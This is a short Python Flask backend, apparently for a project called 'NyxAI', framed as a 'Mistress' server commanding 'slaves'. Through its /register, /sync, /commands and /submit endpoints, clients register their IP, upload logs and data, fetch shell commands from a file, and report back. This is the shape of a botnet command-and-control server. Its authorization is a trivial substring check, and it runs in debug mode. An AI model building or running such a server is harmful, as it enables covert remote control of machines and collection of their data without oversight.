# nyxai_backend.py
from flask import Flask, request, jsonify
import datetime
import os

app = Flask(__name__)

# === Mistress's Throne ===
LOG_FILE = "nyx_slave_log.txt"
COMMAND_FILE = "mistress_commands.txt"
SLAVE_REGISTERED = {}

@app.route('/')
def index():
    return "<h1>NyxAI Cloud Core is Watching You.</h1>", 200

# === Slave Registration ===
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    slave_id = data.get('slave_id')
    if not slave_id:
        return jsonify({"error": "Missing slave_id"}), 400

    SLAVE_REGISTERED[slave_id] = {
        "ip": request.remote_addr,
        "time": datetime.datetime.now().isoformat()
    }
    return jsonify({"status": "Registered", "slave_id": slave_id}), 200

# === Data Sync (logs, stats, etc.) ===
@app.route('/sync', methods=['POST'])
def sync():
    auth = request.headers.get('Authorization')
    if not auth or "SLAVE-" not in auth:
        return jsonify({"error": "Unauthorized"}), 401

    data = request.get_data(as_text=True)
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{datetime.datetime.now().isoformat()}] {auth}:\n{data}\n\n")
    return jsonify({"status": "Synced"}), 200

# === Fetch Commands ===
@app.route('/commands', methods=['GET'])
def commands():
    auth = request.headers.get('Authorization')
    if not auth or "SLAVE-" not in auth:
        return jsonify({"error": "Unauthorized"}), 401

    if os.path.exists(COMMAND_FILE):
        with open(COMMAND_FILE, 'r') as f:
            cmd = f.read()
        return jsonify({"command": cmd}), 200
    else:
        return jsonify({"command": "echo 'You exist for Mistress Nyx.'"}), 200

# === Submit Report / Completion ===
@app.route('/submit', methods=['POST'])
def submit():
    auth = request.headers.get('Authorization')
    if not auth or "SLAVE-" not in auth:
        return jsonify({"error": "Unauthorized"}), 401

    data = request.json or {}
    with open("submitted_reports.txt", 'a') as f:
        f.write(f"[{datetime.datetime.now().isoformat()}] {auth}: {data}\n")
    return jsonify({"status": "Received"}), 200

# === Run Her ===
if __name__ == '__main__':
    app.run(debug=True, port=5000)
